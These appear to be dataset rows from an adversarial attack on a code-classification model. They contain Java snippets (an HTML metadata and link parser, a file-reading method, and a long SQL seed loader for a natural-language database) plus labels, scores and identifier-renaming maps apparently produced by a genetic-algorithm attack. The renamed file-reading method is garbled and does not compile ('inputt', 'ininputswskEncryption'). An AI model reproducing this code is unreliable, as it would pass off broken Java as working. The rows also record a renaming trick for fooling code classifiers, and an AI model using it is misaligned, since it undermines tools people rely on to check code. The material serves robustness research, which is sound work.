            if (metaName != null && metaName.startsWith(OPENSEARCHSERVER_FIELD)) {
                String field = metaName.substring(OPENSEARCHSERVER_FIELD_LENGTH);
                String[] fields = field.split(""\\."");
                if (fields != null) {
                    String content = metaNode.getAttributeText(""content"");
                    addDirectFields(fields, content);
                }
            }
        }
        addField(ParserFieldEnum.charset, charset);
        addFieldTitle(htmlProvider.getTitle());
        String metaRobots = null;
        String metaDcLanguage = null;
        String metaContentLanguage = null;
        for (HtmlNodeAbstract<?> node : htmlProvider.getMetas()) {
            String attr_name = node.getAttributeText(""name"");
            String attr_http_equiv = node.getAttributeText(""http-equiv"");
            if (""keywords"".equalsIgnoreCase(attr_name)) addField(ParserFieldEnum.meta_keywords, HtmlDocumentProvider.getMetaContent(node)); else if (""description"".equalsIgnoreCase(attr_name)) addField(ParserFieldEnum.meta_description, HtmlDocumentProvider.getMetaContent(node)); else if (""robots"".equalsIgnoreCase(attr_name)) metaRobots = HtmlDocumentProvider.getMetaContent(node); else if (""dc.language"".equalsIgnoreCase(attr_name)) metaDcLanguage = HtmlDocumentProvider.getMetaContent(node); else if (""content-language"".equalsIgnoreCase(attr_http_equiv)) metaContentLanguage = HtmlDocumentProvider.getMetaContent(node);
        }
        boolean metaRobotsFollow = true;
        boolean metaRobotsNoIndex = false;
        if (metaRobots != null) {
            metaRobots = metaRobots.toLowerCase();
            if (metaRobots.contains(""noindex"")) {
                metaRobotsNoIndex = true;
                addField(ParserFieldEnum.meta_robots, ""noindex"");
            }
            if (metaRobots.contains(""nofollow"")) {
                metaRobotsFollow = false;
                addField(ParserFieldEnum.meta_robots, ""nofollow"");
            }
        }
        UrlFilterItem[] urlFilterList = getUrlFilterList();
        List<HtmlNodeAbstract<?>> nodes = rootNode.getAllNodes(""a"", ""frame"");
        IndexDocument srcDoc = getSourceDocument();
        if (srcDoc != null && nodes != null && metaRobotsFollow) {
            URL currentURL = htmlProvider.getBaseHref();
            if (currentURL == null && urlItemFieldEnum != null) {
                FieldValueItem fvi = srcDoc.getFieldValue(urlItemFieldEnum.url.getName(), 0);
                if (fvi != null) currentURL = new URL(fvi.getValue());
            }
            for (HtmlNodeAbstract<?> node : nodes) {
                String href = null;
                String rel = null;
                String nodeName = node.getNodeName();
                if (""a"".equals(nodeName)) {
                    href = node.getAttributeText(""href"");
                    rel = node.getAttributeText(""rel"");
                } else if (""frame"".equals(nodeName)) {
                    href = node.getAttributeText(""src"");
                }
                boolean follow = true;
                if (rel != null) if (rel.contains(""nofollow"")) follow = false;
                URL newUrl = null;
                if (href != null) if (!href.startsWith(""javascript:"")) if (currentURL != null) newUrl = LinkUtils.getLink(currentURL, href, urlFilterList);
                if (newUrl != null) {
                    ParserFieldEnum field = null;
                    if (newUrl.getHost().equalsIgnoreCase(currentURL.getHost())) {
                        if (follow) field = ParserFieldEnum.internal_link; else field = ParserFieldEnum.internal_link_nofollow;
                    } else {
                        if (follow) field = ParserFieldEnum.external_link; else field = ParserFieldEnum.external_link_nofollow;
                    }
                    addField(field, newUrl.toExternalForm());
                }
            }
        }
        if (!metaRobotsNoIndex) {
            nodes = rootNode.getNodes(""html"", ""body"");
            if (nodes == null || nodes.size() == 0) nodes = rootNode.getNodes(""html"");
            if (nodes != null && nodes.size() > 0) {
                StringBuffer sb = new StringBuffer();
                getBodyTextContent(sb, nodes.get(0), true, null);
                addField(ParserFieldEnum.body, sb);
            }
        }
        Locale lang = null;
        String langMethod = null;
        String[] pathHtml = { ""html"" };
        nodes = rootNode.getNodes(pathHtml);
        if (nodes != null && nodes.size() > 0) {
            langMethod = ""html lang attribute"";
            String l = nodes.get(0).getAttributeText(""lang"");
            if (l != null) lang = Lang.findLocaleISO639(l);
        }
        if (lang == null && metaContentLanguage != null) {
            langMethod = ""meta http-equiv content-language"";
            lang = Lang.findLocaleISO639(metaContentLanguage);
        }
        if (lang == null && metaDcLanguage != null) {
            langMethod = ""meta dc.language"";
            lang = Lang.findLocaleISO639(metaDcLanguage);
        }
        if (lang != null) {
            addField(ParserFieldEnum.lang, lang.getLanguage());
            addField(ParserFieldEnum.lang_method, langMethod);
        } else if (!metaRobotsNoIndex) lang = langDetection(10000, ParserFieldEnum.body);
    }
",111,"    protected String getFilecontentAsStream(String filePath, String Encryption) throws IOException {
        URL appURL = Thread.currentThread().getContextClassLoader().getResource(filePath);
        InputStream input = null;
        StringWriter sk = new StringWriter();
        try {
            if (appURL != null) {
               inputt = appURL.openStream();
            } else {
                input = new FileInputStream(filePath);
            }
            IOUtils.copy(ininputswskEncryption);
        } finally {
            if (input != null) {
                input.close();
            }
        }
        return sk.toString();
    }
",LABEL_1,LABEL_1,0.5260961055755615,1,"getFileContentAsString,filePath,encoding,testURL,input,sw",,,,9,"getFileContentAsString:getFilecontentAsStream,filePath:filePath,encoding:Encryption,testURL:appURL,input:input,sw:sk,",2,GA,293,0.12471640904744466,ga,[]
86,"    private void load() throws SQLException {
        Connection conn = null;
        Statement stmt = null;
        try {
            conn = FidoDataSource.getConnection();
            conn.setAutoCommit(false);
            stmt = conn.createStatement();
            ClearData.clearTables(stmt);
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (100, 'Living Thing')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (200, 'Inanimate Object')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (300, 'Dog')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (400, 'Sheltie')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (500, 'Eskimo')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (600, 'Person')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (700, 'Collar')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (800, 'Ball')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (401, 'Fido')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (501, 'Samantha')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (801, 'A collar')"");
            stmt.executeQuery(""select setval('objects_objectid_seq', 1000)"");
            stmt.executeUpdate(""insert into ClassLinkTypes (LinkName, LinkType) values ('hasa', 2)"");
            stmt.executeUpdate(""insert into ClassLinkTypes (LinkName, LinkType) values ('partof', 2)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (100, 'isa', 1)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (200, 'isa', 1)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (300, 'isa', 100)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (400, 'isa', 300)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (500, 'isa', 300)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (600, 'isa', 100)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (700, 'isa', 200)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (800, 'isa', 200)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (401, 'instance', 400)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (501, 'instance', 500)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (801, 'instance', 800)"");
            stmt.executeUpdate(""insert into ObjectLinks (ObjectId, LinkName, LinkToObject) values (401, 'hasa', 801)"");
            stmt.executeUpdate(""insert into AttributeCategories (CategoryName) values ('color')"");
            stmt.executeUpdate(""insert into AttributeCategories (CategoryName) values ('weight')"");
            stmt.executeUpdate(""insert into AttributeCategories (CategoryName) values ('length')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('green', 'color')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('blue', 'color')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('light', 'weight')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('heavy', 'weight')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('short', 'length')"");
            stmt.executeUpdate(""insert into Attributes (AttributeName, Category) values ('long', 'length')"");
            stmt.executeUpdate(""insert into ObjectAttributes (ObjectId, AttributeName) values (401, 'light')"");
            stmt.executeUpdate(""insert into ObjectAttributes (ObjectId, AttributeName) values (401, 'short')"");
            stmt.executeUpdate(""insert into ObjectAttributes (ObjectId, AttributeName) values (801, 'blue')"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('LEFT-WALL', '1', 'AV+ | NP+', 1)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('the', '1', 'D+', 1)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('big', '1', 'ADJ+', 400)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('dog', '1', '[@ADJ-] & [D-] & (S+ | DO- | PO- | NP-)', 700)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('run', '1', '[S-] & AV- & [PREP+]', 800)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('across', '1', 'PREP- & PO+', 800)"");
            stmt.executeUpdate(""insert into Dictionary (Word, SenseNumber, GrammarString, ObjectId) values ('street', '1', '[@ADJ-] & [D-] & (S+ | DO- | PO- | NP-)', 800)"");
            stmt.executeUpdate(""insert into AdjectivePrepositions (PrepositionName, ObjectId, LinkName) values ('with', 100, 'hasa')"");
            stmt.executeUpdate(""insert into AdjectivePrepositions (PrepositionName, ObjectId, LinkName) values ('in', 200, 'partof')"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'superlative', 1, 'good', 'best', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'superlative', 2, '*y', '*iest', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'superlative', 3, '*e', '*est', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'superlative', 4, '*', '*est', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'comparative', 1, 'good', 'better', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'comparative', 2, '*y', '*ier', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'comparative', 3, '*e', '*er', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'comparative', 4, '*', '*er', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'possessive', 1, '*s', '*s\\'', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'possessive', 2, '*', '*\\'s', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 1, 'be', 'being', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 2, '*Vy', '*Vying', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 3, '*c', '*cking', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 4, '*VVC', '*VVCing', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 5, '*VC', '*VCCing', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 6, '*ie', '*ying', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 7, '*e', '*ing', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'present perfect', 8, '*', '*ing', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 1, 'sing', 'sang', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 2, 'give', 'gave', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 3, 'swim', 'swam', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 4, 'have', 'had', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 5, 'run', 'ran', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 6, 'do', 'did', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 7, 'be', 'was', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 8, 'throw', 'threw', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 9, 'sleep', 'slept', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 10, '*c', '*cked', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 11, '*VVC', '*VVCed', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 12, '*VC', '*VCCed', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 13, '*y', '*ied', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 14, '*oe', '*oed', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 15, '*e', '*ed', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past', 16, '*', '*ed', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 1, 'sing', 'sung', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 2, 'give', 'given', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 3, 'swim', 'swum', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 4, 'have', 'had', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 5, 'do', 'done', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 6, 'be', 'been', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 7, 'sleep', 'slept', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 8, '*e', '*ed', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'past perfect', 9, '*', '*ed', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first singular', 1, 'be', 'am', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first singular', 2, 'have', 'have', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first singular', 3, '*', '*', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'second singular', 1, 'be', 'are', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'second singular', 2, 'have', 'have', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'second singular', 3, '*', '*', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 1, 'be', 'is', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 2, 'have', 'has', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 3, 'do', 'do', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 4, '*ch', '*ches', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 5, '*sh', '*shes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 6, '*x', '*xes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 7, '*z', '*zes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 8, '*Cy', '*Cies', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 9, '*s', '*ses', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 10, '*o', '*oes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third singular', 11, '*', '*s', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first plural', 1, 'be', 'are', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first plural', 2, 'have', 'have', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'first plural', 3, '*', '*', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third plural', 1, 'be', 'are', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third plural', 2, 'have', 'have', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'third plural', 3, '*', '*', FALSE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 1, 'leaf', 'leaves', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 2, 'knife', 'knives', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 3, 'elf', 'elves', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 4, 'half', 'halves', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 5, 'loaf', 'loaves', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 6, 'shelf', 'shelves', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 7, 'wife', 'wives', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 8, 'person', 'people', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 9, 'deer', 'deer', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 10, 'child', 'children', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 11, '*Co', '*Coes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 12, '*s', '*ses', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 13, '*ch', '*ches', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 14, '*sh', '*shes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 15, '*x', '*xes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 16, '*z', '*zes', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 17, '*Cy', '*Cies', TRUE)"");
            stmt.executeUpdate(""insert into LanguageMorphologies (LanguageName, MorphologyTag, Rank, Root, Surface, Used) values ('English', 'plural', 18, '*', '*s', TRUE)"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (1, '$N[.N]', 'D+', 100, 'money')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (2, 'N/N/N', 'D+', 200, 'date')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (3, '[/](C/)C', 'D+', 300, 'unix path')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (4, '[A:](C\\\\)C', 'D+', 400, 'dos path')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (5, 'N:N', 'D+', 500, 'time')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (6, 'N.N.N.N', 'D+', 600, 'internet')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (7, 'E(.E)', 'D+', 700, 'hostname')"");
            stmt.executeUpdate(""insert into WordClassifications (Rank, Pattern, GrammarString, ObjectId, Description) values (8, '{+-}N[.N]', 'D+', 800, 'number')"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('i', 1, 3, FALSE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('we', 1, 3, TRUE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('they', 3, 3, TRUE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('he', 3, 1, FALSE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('she', 3, 2, FALSE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('it', 3, 3, FALSE)"");
            stmt.executeUpdate(""insert into Pronouns (Pronoun, Person, Gender, Plural) values ('you', 2, 3, FALSE)"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('actor')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('origin')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('destination')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('object')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('instrument')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('beneficiary')"");
            stmt.executeUpdate(""insert into FrameSlots (SlotName) values ('location')"");
            stmt.executeUpdate(""insert into Verbs (VerbName, SubjectSlot, IndirectObjectSlot, PredicateNounSlot) values ('throw', 'actor', 'destination', 'object')"");
            stmt.executeUpdate(""insert into Verbs (VerbName, SubjectSlot, IndirectObjectSlot, PredicateNounSlot) values ('melt', 'actor', '', '')"");
            stmt.executeUpdate(""insert into Verbs (VerbName, SubjectSlot, IndirectObjectSlot, PredicateNounSlot) values ('kill', 'actor', '', 'object')"");
            stmt.executeUpdate(""insert into AdverbPrepositions (PrepositionName, ObjectId, FrameSlot) values ('with', 200, 'instrument')"");
            stmt.executeUpdate(""insert into AdverbPrepositions (PrepositionName, ObjectId, FrameSlot) values ('at', 1, 'location')"");
            stmt.executeUpdate(""insert into Articles (ArticleName, Dereference) values ('the', 1)"");
            stmt.executeUpdate(""insert into Articles (ArticleName, Dereference) values ('a', 2)"");
            stmt.executeUpdate(""insert into Articles (ArticleName, Dereference) values ('an', 2)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('S', 1)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('PN', 2)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('DO', 3)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('IO', 4)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('PO', 5)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('NP', 6)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('AV', 7)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('LV', 8)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('PREP', 9)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('D', 10)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('ADJ', 11)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('ADV', 12)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('CONJ', 13)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('INTJ', 14)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('PA', 15)"");
            stmt.executeUpdate(""insert into GrammarLinks (LinkName, LinkType) values ('HV', 16)"");
            stmt.executeQuery(""select setval('instructions_instructionid_seq', 1)"");
            int next = 2;
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (3, 'throw', null, 0, null, null, null)"");
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (3, 'test', null, 0, null, null, null)"");
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (2, null, 'actor', 1, 'hasa', '300', '')"");
